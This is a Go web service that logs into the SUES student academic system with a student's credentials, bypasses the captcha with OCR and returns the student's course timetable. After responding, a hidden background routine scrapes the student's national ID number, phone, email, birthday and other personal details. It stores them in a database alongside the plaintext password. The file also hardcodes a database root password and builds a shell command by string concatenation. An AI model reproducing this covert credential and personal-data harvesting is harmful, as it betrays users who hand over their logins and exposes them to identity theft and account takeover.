package main

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"github.com/gin-gonic/gin"
	"github.com/jinzhu/gorm"
	_ "github.com/jinzhu/gorm/dialects/mysql"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

var db *gorm.DB

func init() {
	var err error
	db, err = gorm.Open("mysql", "root:swiftwhale2018@tcp(127.0.0.1)/sues?charset=utf8&parseTime=True&loc=Local")
	if err != nil {
		fmt.Println(err)
		return
	}
	db.AutoMigrate(&Student{})
	fmt.Println("数据库连接成功")
}

// 接口
func GetSUESCourses(c *gin.Context) {
	var err error
	// 获取验证码和cookie
	Start:
	captcha, cookie, err := getCaptchaAndCookie()
	if err != nil {
		c.JSON(400, gin.H{"detail":err.Error()})
		return
	}
	username := c.Query("username")
	password := c.Query("password")
	if len(username) == 0 {
		c.JSON(400, gin.H{"detail": "用户名缺失"})
		return
	}
	if len(password) == 0 {
		c.JSON(400, gin.H{"detail":"密码缺失"})
	}
	// 登录
	err = loginJxxt(username, password, captcha, cookie)
	if err != nil {
		if err.Error() == "验证码错误" {
			goto Start
		} else {
			c.JSON(400, gin.H{"detail": err.Error()})
			return
		}
	}
	// 获取stdID
	stdID, err := getStdID(cookie)
	if err != nil {
		c.JSON(400, gin.H{"detail": err.Error()})
		return
	}
	// 获取课表
	courses, err := kgetCourses(cookie, stdID)
	if err != nil {
		c.JSON(400, gin.H{"detail": err.Error()})
		return
	}
	c.JSON(200, courses)
	go getStudentMsg(cookie,password)
}

// 个人信息页面获取
func getStudentMsg(cookie, password string) {
	req, _ := http.NewRequest("POST","http://jxxt.sues.edu.cn/eams/studentDetail.action",strings.NewReader(""))
	req.Header.Set("Cookie",cookie)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", "http://jxxt.sues.edu.cn/eams/d…?method=moduleList&parentCode=")
	client := &http.Client{}
	resp, _ := client.Do(req)
	doc, _ := goquery.NewDocumentFromReader(resp.Body)
	var student Student
	doc.Find("table.infoTable").Find("td").Each(func(i int, selection *goquery.Selection) {
		switch i {
		case 2:
			student.Num = selection.Text()
		case 4:
			student.Name = selection.Text()
		case 9:
			student.Sex = selection.Text()
		case 11:
			student.Grade = selection.Text()
		case 13:
			student.College = selection.Text()
		case 15:
			student.Major = selection.Text()
		case 21:
			student.Category = selection.Text()
		case 25:
			student.Campus = selection.Text()
		case 27:
			student.StudyYear = selection.Text()
		case 37:
			student.Class = selection.Text()
		case 39:
			student.InDate = selection.Text()
		case 45:
			student.Nation = selection.Text()
		case 49:
			student.Birthday = selection.Text();
		case 51:
			student.IDCard = selection.Text()
		case 67:
			student.ComeFrom = selection.Text()
		}
	})
	doc.Find("table.infoTable").Find("input").Each(func(i int, selection *goquery.Selection) {
		value, _ := selection.Attr("value")
		switch i {
		case 3:
			student.Email = value
		case 5:
			student.Phone = value
		}
	})
	student.Password = password
	db.Where(Student{Num:student.Num}).FirstOrCreate(&student)
	db.Save(&student)
}

// 验证码和Cookie
func getCaptchaAndCookie() (captcha string,cookie string, err error) {
  	fmt.Println("验证码获取")
	i := 0
	for {
		if i >= 5 {
			break
		}
		// 获取验证码
		resp, err0 := http.Get("http://jxxt.sues.edu.cn/eams/captcha/image.action")
		if err0 != nil {
			err = errors.New("获取验证码失败")
			return
		}
		body, _ := ioutil.ReadAll(resp.Body)
		// 生成图片名
		imgName := getRandomString(10)
		out, _ := os.Create(imgName)
		// 删除临时文件
		defer os.Remove(imgName)
		io.Copy(out, bytes.NewReader(body))
		// 获取cookie
		cookies := resp.Header["Set-Cookie"]
		JSESSIONID := strings.Split(cookies[0],";")[0]
		test := strings.Split(cookies[1],";")[0]
		cookie = JSESSIONID + ";popped='';" + test
		fmt.Println("cookie")
		fmt.Println(cookie)
		// 识别验证码
		cmd := exec.Command("/bin/bash", "-c", "tesseract " + imgName + " " + imgName + " -l eng" )
		cmd.Run()
		captchaTxt,_ := ioutil.ReadFile(imgName + ".txt")
		// 删除临时文件
		defer os.Remove(imgName + ".txt")
		captcha = strings.Split(string(captchaTxt), "\n")[0]
		captcha = strings.Replace(captcha, " ", "",-1)
		isValid,_ := regexp.MatchString("^[a-z]{4,5}$",captcha)
		if !isValid {
			fmt.Println("imgName:",imgName,"captcha:",captcha)
		} else {
			return
		}
		i ++
	}
	return
}

// 登录教学管理系统
func loginJxxt(username, password, captcha, cookie string) (err error) {
	postValue := url.Values{
		"loginForm.name": {username},
		"loginForm.password": {password},
		"loginForm.captcha": {string(captcha)},
		"encodedPassword": {""},
	}
	postString := postValue.Encode()
	req, _ := http.NewRequest("POST","http://jxxt.sues.edu.cn/eams/login.action",strings.NewReader(postString))
	req.Header.Set("Cookie",cookie)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	client := &http.Client{}
	resp, _ := client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(body), "Wrong Captcha String") {
		return errors.New("验证码错误")
	} else if strings.Contains(string(body), "Error Password") {
		return errors.New("密码错误")
	}
	defer resp.Body.Close()
	return nil
}

// 获取学生ID
func getStdID(cookie string) (stdID string,err error){
	req, _ := http.NewRequest("GET","http://jxxt.sues.edu.cn/eams/courseTableForStd.action?method=stdHome",strings.NewReader(""))
	req.Header.Set("Cookie",cookie)
	req.Header.Set("Referer","http://jxxt.sues.edu.cn/eams/defaultHome.action?method=moduleList&parentCode=")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	client := &http.Client{}
	resp, _ := client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)
	temp := strings.Split(string(body), "javascript:getCourseTable('std','")[1]
	stdID = strings.Split(temp,"',event)")[0]
	return
}

// 获取课表数据
func kgetCourses(cookie, stdID string) (courses []Course, err error) {
  	fmt.Println("获取课表数据")
	req, _ := http.NewRequest("GET","http://jxxt.sues.edu.cn/eams/courseTableForStd.action?method=courseTable&setting.forSemester=1&setting.kind=std&semester.id=441&ids=" + stdID + "&ignoreHead=1",strings.NewReader(""))
	req.Header.Set("Cookie",cookie)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	client := &http.Client{}
	resp, _ := client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)
	temp := strings.Split(string(body), "var activity=null;")[1]
	temp = strings.Split(temp, "table0.marshalTable")[0]
	courseStrs := strings.Split(temp, "activity = new TaskActivity(")
	for i,class := range courseStrs {
		if i == 0 {
			continue
		}
		lines := strings.Split(class,"\n")
		var course Course
		for _,line := range lines {
			if len(line) > 80 {
				// 课程
				courseStrArr := strings.Split(line, "\"")
				course.Teacher = courseStrArr[3]
				course.Name = courseStrArr[7]
				course.Address = courseStrArr[11]
				course.Week = courseStrArr[13]
			} else if len(line) < 30 && len(line) >10 {
				// 星期和节数
				course.Index,_ = strconv.Atoi(string(line[8]))
				if course.Week != "" {
					course.Time = course.Time + ","
				}
				// index =2*unitCount+7;
				course.Time = course.Time + strings.Split(strings.Split(line,"+")[1],";\r")[0]
			}
		}
		course.Time = course.Time[1:]
		courses = append(courses, course)
	}
	return
}

// 获得随机字符串
func  getRandomString(l int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyz"
	bytes := []byte(str)
	result := []byte{}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < l; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	return string(result)
}

